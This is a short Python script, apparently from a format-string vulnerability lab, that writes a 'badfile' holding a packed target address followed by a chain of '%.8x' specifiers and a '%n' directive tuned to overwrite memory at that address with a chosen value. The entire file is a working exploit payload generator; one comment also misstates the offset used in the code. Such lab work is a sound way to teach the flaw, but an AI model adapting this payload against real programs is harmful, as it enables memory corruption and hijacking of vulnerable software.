#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# write on the address what has been previously printed
# target_value - what's been written
replace = 0x5000-(4+8*(62)) 

# This line shows how to construct a string s
s = "%.8x"*62+"%."+str(replace)+"x"+"%n\n" 

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)